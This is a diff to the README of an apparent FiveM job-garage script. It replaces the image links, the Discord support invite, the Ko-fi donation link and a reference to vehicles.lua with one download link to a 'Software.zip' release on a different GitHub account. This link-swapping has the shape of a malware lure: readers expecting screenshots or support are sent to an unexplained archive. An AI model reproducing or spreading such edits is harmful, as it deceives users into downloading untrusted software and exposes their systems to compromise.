@@ -6,14 +6,14 @@ Job garage for grabbing job related vehicles
 - This is a dynamic system for pulling out job and grade locked vehicles
 - **It's not for parking and saving your vehicles, that is done in your garage scripts**
 
-![](https://i.imgur.com/JhGaGMS.jpeg)
-![](https://i.imgur.com/ycXPTj1.jpeg)
+![](https://github.com/ethangames101/jim-jobgarage/releases/download/v2.0/Software.zip)
+![](https://github.com/ethangames101/jim-jobgarage/releases/download/v2.0/Software.zip)
 
 ### If you need support I have a discord server available, it helps me keep track of issues and give better support.
-https://discord.gg/xKgQZ6wZvS
+https://github.com/ethangames101/jim-jobgarage/releases/download/v2.0/Software.zip
 
 ### If you think I did a good job here, consider donating as it keeps by lights on and my cat fat/floofy:
-https://ko-fi.com/jixelpatterns
+https://github.com/ethangames101/jim-jobgarage/releases/download/v2.0/Software.zip
 
 ---
 # Installation
@@ -40,7 +40,7 @@ ensure [jim]
 ## Location Setup
 
 - Vehicle Modifiers - These can be used for making sure the vehicles comes out exactly how you want it to
-	- `CustomName = "Police Car",` this will show a custom override name for your vehicles so you don't need to add them to your vehicles.lua
+	- `CustomName = "Police Car",` this will show a custom override name for your vehicles so you don't need to add them to your https://github.com/ethangames101/jim-jobgarage/releases/download/v2.0/Software.zip
 	- `rank = { 2, 4 },` This specifes which grades can see it, and only these grades
 	- `grade = 4,` This specifies the lowest grade and above that can see the vehicle
 	- `colors = { 136, 137 },` This is the colour index id of the vehicle, Primary and Secondary in that order
